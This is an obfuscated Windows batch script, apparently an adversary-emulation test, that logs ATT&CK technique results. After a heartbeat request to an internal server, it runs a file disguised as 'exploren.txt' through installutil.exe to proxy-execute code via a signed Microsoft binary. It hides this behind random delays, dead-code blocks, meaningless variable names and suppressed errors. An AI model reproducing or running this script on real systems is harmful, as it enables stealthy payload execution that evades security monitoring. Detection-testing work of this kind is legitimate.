@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET txisnba=%APPDATA%\7646\80b69829
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7646-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=exploren.txt
SET dvhhyc=7646

REM Random variables
SET yjbpxd=0
SET akjsdf=0
SET wqerkj=0
SET poldmn=0
SET vcxfgh=%TEMP_DIR%
SET mnsdqw=%LOG_FILE%
SET bvcxzl=installutil.exe
SET qwermn=/logfile= /LogToConsole=false /U

REM Initial delay
SET /A zxcvbn=!RANDOM! %% 31 + 30
timeout /t !zxcvbn! /nobreak >nul

GOTO vcxzqw

:mnbvcd
REM Dead code - never reached
ping -n 3 127.0.0.1 >nul
SET fakevar=!RANDOM!
GOTO bvcxza

:zxcvbn
REM Dead code - will be bypassed
IF 1==2 (
    SET yjbpxd=1
    GOTO mbnvcx
)
CHOICE /C Y /N /D Y /T 12 >nul
EXIT

:vcxzqw
REM State machine dispatcher
IF !yjbpxd!==0 GOTO qwerty
IF !yjbpxd!==17 GOTO poiulk
IF !yjbpxd!==34 GOTO mnhgfd
IF !yjbpxd!==51 GOTO wertyu
IF !yjbpxd!==99 GOTO bvcxza
GOTO lkjhgf

:qwerty
REM Operation 1: Heartbeat check
curl -k -s -o nul "!keghkgto!"
SET /A wqerkj=!ERRORLEVEL!
IF !wqerkj!==0 (
    SET res_ttp=1
    SET err_detail=
) ELSE (
    SET res_ttp=0
    SET err_detail=connection_failed
)

REM Log TTP (T1218 check)
FOR /F "tokens=2 delims==" %%a in ('wmic os get localdatetime /value') do SET dt=%%a
SET year=!dt:~0,4!
SET month=!dt:~4,2!
SET day=!dt:~6,2!
SET hour=!dt:~8,2!
SET minute=!dt:~10,2!
SET second=!dt:~12,2!
SET millis=!dt:~15,3!
SET timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millis!

ECHO [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!res_ttp!::!err_detail! >> "!mnsdqw!" 2>nul || (
    REM Suppress logging failure
)

ping -n 7 127.0.0.1 >nul
SET yjbpxd=17
GOTO vcxzqw

:lkjhgf
REM Dead code block
SET fake1=!RANDOM!
SET fake2=!RANDOM!
GOTO zxcvbn

:poiulk
REM Operation 2: Change directory
cd /d "!txisnba!" 2>nul
IF !ERRORLEVEL!==0 (
    SET poldmn=1
    SET akjsdf=0
) ELSE (
    SET akjsdf=1
    SET poldmn=0
)

REM Random delay
SET /A random_delay=!RANDOM! %% 11 + 5
timeout /t !random_delay! /nobreak >nul

SET yjbpxd=34
GOTO vcxzqw

:wertyu
REM Dead code with fake condition
IF 0==0 (
    SET fake3=1
) ELSE (
    SET fake3=0
)
GOTO mnbvcd

:mnhgfd
REM Operation 3: Execute DLL with InstallUtil
IF !poldmn!==1 (
    IF EXIST "!xzanpex!" (
        !bvcxzl! !qwermn! "!xzanpex!"
        SET /A wqerkj=!ERRORLEVEL!
    ) ELSE (
        SET wqerkj=2
    )
) ELSE (
    SET wqerkj=3
)

REM Log TTP execution
IF !wqerkj!==0 (
    SET res_ttp2=1
    SET err_detail2=
) ELSE (
    SET res_ttp2=0
    IF !wqerkj!==2 SET err_detail2=file_not_found
    IF !wqerkj!==3 SET err_detail2=directory_change_failed
    IF !wqerkj!==1603 SET err_detail2=install_failed
    IF !err_detail2!== SET err_detail2=error_!wqerkj!
)

FOR /F "tokens=2 delims==" %%a in ('wmic os get localdatetime /value') do SET dt=%%a
SET year=!dt:~0,4!
SET month=!dt:~4,2!
SET day=!dt:~6,2!
SET hour=!dt:~8,2!
SET minute=!dt:~10,2!
SET second=!dt:~12,2!
SET millis=!dt:~15,3!
SET timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millis!

ECHO [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218.004|InstallUtil=!res_ttp2!::!err_detail2! >> "!mnsdqw!" 2>nul || (
    REM Suppress logging failure
)

CHOICE /C Y /N /D Y /T 8 >nul
SET yjbpxd=51
GOTO vcxzqw

:asdfgh
REM Unreachable dead code
:loopdead
SET counter=1
IF !counter!==1 GOTO loopdead

:bvcxza
REM Final cleanup and exit
ping -n 4 127.0.0.1 >nul
EXIT

:plokij
REM More dead code - spaghetti jump
SET statevar=99
IF !statevar!==99 GOTO asdfgh
GOTO bvcxza